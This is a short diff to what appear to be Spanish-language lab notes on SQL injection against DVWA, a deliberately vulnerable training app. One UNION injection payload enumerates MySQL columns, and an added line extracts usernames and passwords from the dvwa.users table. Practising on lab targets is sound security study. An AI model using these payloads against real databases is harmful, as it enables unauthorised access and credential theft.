@@ -117,4 +117,5 @@ Todas las bases de datos y sus tablas de MySQL:
 Todas las columnas de MySQL:
 ```
 999' UNION select null, table_name, column_name FROM information_Schema.columns;#
+999' UNION select concat(user, '--', password), null FROM dvwa.users;#
 ```
